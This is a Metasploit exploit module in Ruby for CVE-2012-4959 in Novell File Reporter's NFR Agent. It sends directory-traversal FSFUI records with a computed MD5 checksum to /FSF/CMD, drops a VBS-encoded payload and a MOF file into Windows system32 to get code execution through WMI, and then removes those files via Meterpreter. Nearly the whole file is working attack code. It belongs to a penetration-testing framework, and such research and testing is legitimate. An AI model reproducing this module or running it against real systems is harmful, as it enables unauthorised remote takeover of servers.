##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'NFR Agent FSFUI Record File Upload RCE',
			'Description'    => %q{
				NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to upload
				arbitrary files via a directory traversal while handling requests to /FSF/CMD with
				FSFUI records with UICMD 130. This module has been tested successfully against NFR
				Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File Reporter 1.0.1).
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'juan vazquez'
				],
			'References'     =>
				[
					[ 'CVE', 'CVE-2012-4959'],
					[ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]
				],
			'Payload'        =>
				{
					'Space'           => 2048,
					'StackAdjustment' => -3500
				},
			'DefaultOptions' =>
				{
					'WfsDelay' => 20
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					#Windows before Vista
					[ 'Automatic', { } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 16 2012'))

		register_options(
			[
				Opt::RPORT(3037),
				OptBool.new('SSL', [true, 'Use SSL', true]),
				OptInt.new('DEPTH', [true, 'Traversal depth', 6])
			], self.class)

	end

	def on_new_session(client)

		return if not @var_mof_name
		return if not @var_vbs_name

		if client.type != "meterpreter"
			print_error("NOTE: you must use a Meterpreter payload in order to automatically clean up.")
			print_error("The following files must be removed manually:")
			print_error("The VBS payload: %WINDIR%\\system32\\#{@var_vbs_name}.vbs")
			print_error("The MOF file (%WINDIR%\\system32\\wbem\\mof\\good\\#{@var_mof_name}.mof)")
			return # That's it
		end

		# stdapi must be loaded before we can use fs.file
		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

		begin
			print_good("Deleting the VBS payload \"#{@var_vbs_name}.vbs\" ...")
			windir = client.fs.file.expand_path("%WINDIR%")
			client.fs.file.rm("#{windir}\\system32\\" + @var_vbs_name + ".vbs")
			print_good("Deleting the MOF file \"#{@var_mof_name}.mof\" ...")
			cmd = "#{windir}\\system32\\attrib.exe -r " +
				"#{windir}\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof"
			client.sys.process.execute(cmd, nil, {'Hidden' => true })
			client.fs.file.rm("#{windir}\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof")
		rescue ::Exception => e
			print_error("Exception: #{e.inspect}")
		end

	end

	def peer
		"#{rhost}:#{rport}"
	end

	def exploit

		# In order to save binary data to the file system the payload is written to a .vbs
		# file and execute it from there.
		@var_mof_name = rand_text_alpha(rand(5)+5)
		@var_vbs_name = rand_text_alpha(rand(5)+5)

		print_status("Encoding payload into VBS...")
		payload = generate_payload_exe
		vbs_content = Msf::Util::EXE.to_exe_vbs(payload)

		print_status("Generating VBS file...")
		mof_content = generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs")

		print_status("#{peer} - Uploading the VBS file")
		worked = upload_file("WINDOWS\\system32\\#{@var_vbs_name}.vbs", vbs_content)
		unless worked
			fail_with(Failure::NotVulnerable, "Failed to upload the file")
		end

		print_status("#{peer} - Uploading the MOF file")
		upload_file("WINDOWS\\system32\\wbem\\mof\\#{@var_mof_name}.mof", mof_content)
	end

	def upload_file(filename, content)
		traversal = "..\\" * datastore['DEPTH']
		traversal << filename

		record = "<RECORD><NAME>FSFUI</NAME><UICMD>130</UICMD><FILE>#{traversal}</FILE><![CDATA[#{content}]]></RECORD>"
		md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
		message = md5 + record

		res = send_request_cgi(
			{
				'uri'     => '/FSF/CMD',
				'version' => '1.1',
				'method'  => 'POST',
				'ctype'   => "text/xml",
				'data'    => message,
			})

		if res and res.code == 200 and res.body.include? "<RESULT><VERSION>1</VERSION><STATUS>0</STATUS></RESULT>"
			print_warning("#{peer} - File successfully uploaded: #{filename}")
		else
			print_error("#{peer} - Failed to upload the file")
			return false
		end

		true
	end

end
